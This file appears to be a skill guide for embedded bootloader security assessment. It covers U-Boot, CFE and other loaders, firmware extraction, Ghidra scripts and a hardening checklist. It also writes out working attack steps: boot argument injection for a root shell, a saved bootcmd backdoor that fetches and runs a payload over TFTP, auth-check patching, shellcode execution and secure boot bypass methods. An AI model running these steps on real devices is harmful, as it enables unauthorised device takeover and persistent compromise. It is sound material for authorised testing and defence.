---
name: bootloader-security
description: U-Boot and embedded bootloader security analysis — environment variable attacks, secure boot bypass, boot sequence exploitation, and firmware integrity verification
---

# Bootloader Security Analysis

## Bootloader Identification

### Common Embedded Bootloaders
| Bootloader | Detection Strings | Typical Targets |
|-----------|-------------------|-----------------|
| U-Boot | `U-Boot`, `autoboot`, `Hit any key to stop` | Routers, NAS, cameras, set-top boxes |
| CFE (Broadcom) | `CFE>`, `Broadcom CFE` | Broadcom-based routers (Netgear, Linksys, ASUS) |
| RedBoot | `RedBoot>`, `eCos RedBoot` | Older embedded Linux devices |
| Barebox | `barebox`, `barebox>` | Industrial embedded systems |
| GRUB | `GNU GRUB`, `grub>` | x86-based IoT gateways |
| LK (Little Kernel) | `[LK]`, `little kernel` | Android-based IoT, Qualcomm devices |
| Coreboot | `coreboot`, `SeaBIOS` | Some x86 embedded platforms |

### Extracting Bootloader from Firmware
```bash
# Search for U-Boot signature in firmware dump
binwalk -e firmware.bin
strings firmware.bin | grep -i "u-boot\|autoboot\|bootcmd\|bootargs"

# Extract U-Boot binary (look for 0x27051956 magic — uImage header)
binwalk -R '\x27\x05\x19\x56' firmware.bin

# Find U-Boot environment block (CRC32 + key=value\0 pairs)
# Environment is typically at a fixed offset, 64KB-256KB in size
binwalk -R 'bootcmd=' firmware.bin
binwalk -R 'bootdelay=' firmware.bin
```

## U-Boot Attack Surface

### 1. Environment Variable Manipulation

**Accessing U-Boot Console**
```
# During boot, press key to interrupt autoboot (space, Enter, Ctrl+C, or any key)
# Common bootdelay values: 1-5 seconds
# Some devices use secret key combination or password

# If bootdelay=0 or bootdelay=-1 (no abort):
# Try UART break signal before power-on
# Or flood UART with characters during power-on
```

**Critical Environment Variables**
| Variable | Purpose | Attack Potential |
|----------|---------|-----------------|
| `bootcmd` | Commands executed at boot | Arbitrary command execution |
| `bootargs` | Linux kernel command line | Root shell via `init=/bin/sh` |
| `serverip` | TFTP server address | Point to attacker-controlled server |
| `ipaddr` | Device IP | Redirect network traffic |
| `bootfile` | TFTP boot filename | Load malicious kernel/rootfs |
| `ethaddr` | MAC address | Network impersonation |
| `verify` | Image verification flag | Set to `n` to skip verification |

**Boot Argument Injection**
```
# Get root shell by modifying kernel boot arguments
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs init=/bin/sh"
boot

# Alternative: append single-user mode
setenv bootargs "${bootargs} single"
boot

# Load custom kernel via TFTP
setenv serverip 192.168.1.100
setenv bootfile malicious_kernel.uImage
tftpboot ${loadaddr} ${bootfile}
bootm ${loadaddr}
```

**Persistent Backdoor via Environment**
```
# Save modified environment to flash (persists across reboots)
setenv bootcmd "run backdoor; run original_boot"
setenv backdoor "tftpboot 0x80000000 192.168.1.100:payload.bin; go 0x80000000"
saveenv
```

### 2. Memory Access Attacks

**Reading Sensitive Data**
```
# Dump flash contents to find keys, passwords, configs
md.b 0x9F000000 0x1000    # Read 4KB from SPI flash
md.b 0xBFC00000 0x100     # Read from boot ROM area

# Search for certificate/key material
# Dump large region and search offline:
md.b 0x9F000000 0x100000  # Dump 1MB

# Read RAM for runtime secrets
md.b 0x80000000 0x10000   # Dump 64KB of RAM
```

**Writing to Memory**
```
# Overwrite authentication check in RAM
mw.b <auth_check_addr> 0x00 0x04   # NOP out auth check
# Or patch return value:
mw.l <auth_func_ret> 0x00000001    # Force return TRUE

# Write shellcode to RAM and execute
mw.l 0x80100000 <shellcode_word1>
mw.l 0x80100004 <shellcode_word2>
go 0x80100000
```

### 3. Secure Boot Bypass Techniques

**Common Secure Boot Implementations**
```
Verification Chain:
ROM Bootloader (immutable) → SPL/TPL → U-Boot → Kernel → Rootfs

Bypass Opportunities:
1. ROM bootloader has no verification → entire chain compromised
2. SPL verifies U-Boot, but U-Boot doesn't verify kernel
3. Signed kernel, but rootfs is not verified
4. Verification uses weak algorithm (SHA1, MD5, CRC32)
5. Public key stored in writable flash → key replacement attack
```

**FIT Image Verification Bypass**
```
# U-Boot FIT (Flattened Image Tree) signed images
# Check if CONFIG_FIT_SIGNATURE is enabled
strings u-boot.bin | grep -i "fit_signature\|rsa_verify\|sha256"

# Bypass strategies:
# 1. If only "required" images are verified, add unverified components
# 2. Downgrade attack: load older firmware without signature requirement
# 3. Configuration node manipulation in FIT image DTB
# 4. Hash collision on weak algorithms (SHA1)
```

**Hardware-Assisted Bypass**
```
# Voltage glitching during signature verification
# Target: branch instruction after RSA/ECDSA verify call
# Tools: ChipWhisperer, custom FPGA glitcher
# Timing: monitor UART output for verification start marker

# JTAG/SWD bypass (if debug port accessible)
# Connect debugger → break at verification function → patch return value
# OpenOCD: set register to force success
```

### 4. Firmware Update Mechanism Analysis

**Update Integrity Checks**
```bash
# Identify update verification method
strings firmware.bin | grep -iE "md5|sha1|sha256|sha512|rsa|ecdsa|verify|signature|crc"

# Weak verification indicators:
# - CRC32 only → trivially bypassed
# - MD5 only → collision attacks possible  
# - No signature → integrity but not authenticity
# - Hardcoded public key → secure if key management is proper
```

**Anti-Rollback Analysis**
```
# Check for version/monotonic counter enforcement
# Look for eFuse or OTP-based version counters
strings firmware.bin | grep -iE "anti.rollback\|version.check\|fuse\|otp\|monotonic"

# If no anti-rollback:
# 1. Obtain older firmware version (vendor website, Wayback Machine)
# 2. Flash older version that may have known vulnerabilities
# 3. Or flash older version that doesn't enforce signature verification
```

## CFE (Broadcom) Bootloader Analysis

```
# CFE console access
# Default: UART at 115200 baud
# Some devices: Ctrl+C during boot

# CFE commands for exploitation:
flash -noheader <addr>:<size> flash0.boot    # Overwrite bootloader
flash -noheader <addr>:<size> flash0.trx     # Overwrite firmware
dm <addr> <size>                              # Dump memory
sm <addr> <value>                             # Set memory
go <addr>                                     # Execute code
ifconfig eth0 -addr=<ip> -mask=<mask>         # Configure network
```

## Binary Analysis in Ghidra

### Locating Bootloader Security Functions
```python
# Ghidra script: Find U-Boot verification-related functions
from ghidra.program.model.symbol import SymbolType

keywords = ["verify", "rsa", "sha256", "signature", "secure_boot", 
            "fit_check", "image_check", "authenticate"]

listing = currentProgram.getListing()
sm = currentProgram.getSymbolTable()

for symbol in sm.getAllSymbols(True):
    name = symbol.getName().lower()
    if any(kw in name for kw in keywords):
        print(f"Security function: {symbol.getName()} @ {symbol.getAddress()}")
```

### Identifying Authentication Bypass Points
```python
# Find functions that compare credentials or check passwords
keywords = ["password", "passwd", "login", "auth", "check_pass", "validate"]
for func in currentProgram.getFunctionManager().getFunctions(True):
    name = func.getName().lower()
    if any(kw in name for kw in keywords):
        print(f"Auth function: {func.getName()} @ {func.getEntryPoint()}")
        # Check for hardcoded comparison values in the function body
```

## Security Assessment Checklist

1. **Console Access** — Can bootloader console be reached via UART/serial?
2. **Boot Delay** — Is there an autoboot delay allowing interruption?
3. **Password Protection** — Is the bootloader console password-protected?
4. **Environment Lock** — Are env variables read-only or locked?
5. **Secure Boot** — Is the boot chain cryptographically verified?
6. **Update Verification** — Are firmware updates signed and verified?
7. **Anti-Rollback** — Is firmware downgrade prevented?
8. **Debug Interfaces** — Are JTAG/SWD disabled in production?
9. **Memory Access** — Can sensitive memory regions be read from console?
10. **Network Boot** — Can TFTP/NFS boot be triggered from console?
